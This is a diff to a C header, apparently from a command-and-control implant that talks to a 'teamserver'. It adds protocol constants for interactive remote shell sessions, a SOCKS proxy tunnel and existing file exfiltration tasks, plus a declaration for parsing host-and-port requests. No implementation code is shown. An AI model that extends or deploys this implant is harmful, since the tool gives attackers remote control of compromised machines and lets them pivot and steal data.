@@ -9,10 +9,30 @@
 #define TASK_FILE_STAGE  3
 #define TASK_FILE_EXFIL  4
 
+#define TASK_INTERACTIVE  20
+#define TASK_SHELL_START  21
+#define TASK_SHELL_INPUT  22
+#define TASK_SHELL_OUTPUT 23
+#define TASK_SHELL_STOP   24
+
+#define TASK_SOCKS_OPEN   25
+#define TASK_SOCKS_DATA   26
+#define TASK_SOCKS_CLOSE  27
+#define TASK_SOCKS_ACK    28
+#define TASK_SOCKS_START  29
+#define TASK_SOCKS_STOP   30
+
+/* Connection types for TCP handshake */
+#define CONN_SESSION  0
+#define CONN_SHELL    1
+#define CONN_SOCKS    2
+
 /* Task codes */
 #define CODE_EXIT_NORMAL  0
 #define CODE_SET_SLEEP    0
 #define CODE_RUN_SHELL    0
+#define CODE_SOCKS_OK     0
+#define CODE_SOCKS_FAIL   1
 
 /* Task flags */
 #define FLAG_NONE         ((uint16_t)0)
@@ -66,3 +86,9 @@ void encode_run_rep(const char *output, uint8_t *out, int *out_len);
 /* encode_metadata: serializes meta → out using teamserver-compatible format.
    Sets *out_len. out must be at least 512 bytes. */
 void encode_metadata(const implant_metadata_t *meta, uint8_t *out, int *out_len);
+
+/* parse_interactive_req: extracts host string and port from INTERACTIVE-REQ.
+   Format: uint32 LE host_len + host bytes + uint16 LE port.
+   out_host is NUL-terminated. Returns 0 on success, -1 on error. */
+int parse_interactive_req(const uint8_t *buf, int buf_len,
+                          char *out_host, int max_host, uint16_t *out_port);
